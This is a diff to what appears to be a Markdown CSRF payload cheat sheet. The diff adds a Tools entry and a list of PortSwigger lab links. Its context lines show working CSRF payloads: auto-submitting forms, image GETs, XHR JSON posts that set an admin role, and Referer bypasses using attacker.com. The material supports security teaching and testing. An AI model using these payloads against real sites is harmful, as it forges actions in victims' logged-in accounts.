@@ -5,6 +5,7 @@
 
 ## Summary
 
+* [Tools](#tools)
 * [Methodology](#methodology)
 * [Payloads](#payloads)
     * [HTML GET - Requiring User Interaction](#html-get---requiring-user-interaction)
@@ -20,11 +21,14 @@
     * [With question mark payload](#with-question-mark-payload)
     * [With semicolon payload](#with-semicolon-payload)
     * [With subdomain payload](#with-subdomain-payload)
+* [Labs](#labs)
 * [References](#references)
+
 
 ## Tools
 
 * [XSRFProbe - The Prime Cross Site Request Forgery Audit and Exploitation Toolkit.](https://github.com/0xInfection/XSRFProbe)
+
 
 ## Methodology
 
@@ -34,17 +38,20 @@
 
 When you are logged in to a certain site, you typically have a session. The identifier of that session is stored in a cookie in your browser, and is sent with every request to that site. Even if some other site triggers a request, the cookie is sent along with the request and the request is handled as if the logged in user performed it.
 
+
 ### HTML GET - Requiring User Interaction
 
 ```html
 <a href="http://www.example.com/api/setusername?username=CSRFd">Click Me</a>
 ```
 
+
 ### HTML GET - No User Interaction
 
 ```html
 <img src="http://www.example.com/api/setusername?username=CSRFd">
 ```
+
 
 ### HTML POST - Requiring User Interaction
 
@@ -54,6 +61,7 @@ When you are logged in to a certain site, you typically have a session. The iden
  <input type="submit" value="Submit Request" />
 </form>
 ```
+
 
 ### HTML POST - AutoSubmit - No User Interaction
 
@@ -67,6 +75,7 @@ When you are logged in to a certain site, you typically have a session. The iden
  document.getElementById("autosubmit").submit();
 </script>
 ```
+
 
 ### HTML POST - multipart/form-data with file upload - Requiring User Interaction
 
@@ -100,6 +109,7 @@ xhr.send();
 </script>
 ```
 
+
 ### JSON POST - Simple Request
 
 ```html
@@ -114,6 +124,7 @@ xhr.setRequestHeader("Content-Type", "text/plain");
 xhr.send('{"role":admin}');
 </script>
 ```
+
 
 ### JSON POST - Complex Request
 
@@ -159,6 +170,19 @@ Referer: https://attacker.com/csrf.html;trusted.domain.com
 
 Referer: https://trusted.domain.com.attacker.com/csrf.html
 ```
+
+
+## Labs
+
+* [CSRF vulnerability with no defenses](https://portswigger.net/web-security/csrf/lab-no-defenses)
+* [CSRF where token validation depends on request method](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-request-method)
+* [CSRF where token validation depends on token being present](https://portswigger.net/web-security/csrf/lab-token-validation-depends-on-token-being-present)
+* [CSRF where token is not tied to user session](https://portswigger.net/web-security/csrf/lab-token-not-tied-to-user-session)
+* [CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/lab-token-tied-to-non-session-cookie)
+* [CSRF where token is duplicated in cookie](https://portswigger.net/web-security/csrf/lab-token-duplicated-in-cookie)
+* [CSRF where Referer validation depends on header being present](https://portswigger.net/web-security/csrf/lab-referer-validation-depends-on-header-being-present)
+* [CSRF with broken Referer validation](https://portswigger.net/web-security/csrf/lab-referer-validation-broken)
+
 
 ## References
 
